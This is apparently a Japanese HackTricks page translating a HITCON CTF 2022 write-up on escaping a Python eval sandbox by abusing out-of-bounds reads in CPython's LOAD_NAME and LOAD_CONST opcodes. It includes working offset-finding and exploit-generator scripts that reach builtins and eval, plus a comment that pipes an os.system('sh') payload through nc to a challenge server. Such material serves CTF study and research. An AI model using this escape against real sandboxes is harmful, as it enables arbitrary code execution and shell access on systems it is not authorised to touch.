# LOAD\_NAME / LOAD\_CONSTオペコード OOBリード

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

**この情報は** [**この解説記事**](https://blog.splitline.tw/hitcon-ctf-2022/) **から取得されました。**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

LOAD\_NAME / LOAD\_CONSTオペコードのOOBリード機能を使用して、メモリ内のいくつかのシンボルを取得することができます。つまり、`(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)`のようなトリックを使用して、必要なシンボル（関数名など）を取得できます。

その後、エクスプロイトを作成します。

### 概要 <a href="#overview-1" id="overview-1"></a>

ソースコードは非常に短く、わずか4行しかありません！
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
任意のPythonコードを入力することができ、それは[Pythonコードオブジェクト](https://docs.python.org/3/c-api/code.html)にコンパイルされます。ただし、そのコードオブジェクトの`co_consts`と`co_names`は、そのコードオブジェクトを評価する前に空のタプルに置き換えられます。

したがって、定数（例：数値、文字列など）または名前（例：変数、関数）を含むすべての式は、最終的にセグメンテーションフォールトを引き起こす可能性があります。

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

セグメンテーションフォールトはどのように発生するのでしょうか？

簡単な例から始めましょう。`[a, b, c]`は、次のバイトコードにコンパイルされる可能性があります。
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
しかし、`co_names`が空のタプルになった場合はどうなるでしょうか？`LOAD_NAME 2`オペコードは実行され、元々のメモリアドレスから値を読み取ろうとします。はい、これは範囲外の読み取りの「機能」です。

解決策の核心コンセプトはシンプルです。CPythonの一部のオペコード、例えば`LOAD_NAME`と`LOAD_CONST`は、OOB読み取りの脆弱性があります。

これらのオペコードは、`consts`または`names`タプル（`co_consts`と`co_names`という名前で内部的に呼ばれる）からインデックス`oparg`のオブジェクトを取得します。CPythonが`LOAD_CONST`オペコードを処理する際に行うことを以下の短いスニペットで確認できます。
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
この方法では、OOB（Out-of-Bounds）機能を使用して、任意のメモリオフセットから「name」を取得することができます。どの名前を持っているか、そしてオフセットがどれであるかを確認するために、単に`LOAD_NAME 0`、`LOAD_NAME 1`... `LOAD_NAME 99`...と試してみてください。そして、おそらくoparg > 700のあたりで何かを見つけることができるでしょう。もちろん、gdbを使用してメモリレイアウトを確認することもできますが、より簡単ではないと思います。

### Exploitの生成 <a href="#generating-the-exploit" id="generating-the-exploit"></a>

名前/定数の有用なオフセットを取得したら、そのオフセットから名前/定数を取得して使用する方法はどうすればいいのでしょうか？以下のトリックを使ってみましょう：\
オフセット5（`LOAD_NAME 5`）から`__getattribute__`の名前を取得できると仮定し、`co_names=()`で次の手順を実行します：
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> 注意：`__getattribute__`という名前である必要はありません。短い名前や奇妙な名前でも構いません。

その理由は、バイトコードを表示するだけで理解できます：
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
`LOAD_ATTR`は`co_names`からも名前を取得します。Pythonは同じ名前の場合、同じオフセットから名前を読み込みますので、2番目の`__getattribute__`はまだオフセット5から読み込まれます。この特徴を利用すると、名前が近くのメモリにある限り、任意の名前を使用することができます。

数値の生成は簡単です:

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

長さ制限のため、定数は使用していません。

まず、名前のオフセットを見つけるためのスクリプトを以下に示します。
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
そして、以下は実際のPythonエクスプロイトを生成するためのものです。
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
基本的には、`__dir__` メソッドから取得した文字列に対して、以下のことを行います。
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社で働いていますか？** **HackTricksで会社を宣伝したいですか**？または、**最新バージョンのPEASSにアクセスしたいですか**、または**HackTricksをPDFでダウンロードしたいですか**？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを！
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう！
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有する**ために、[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。

</details>
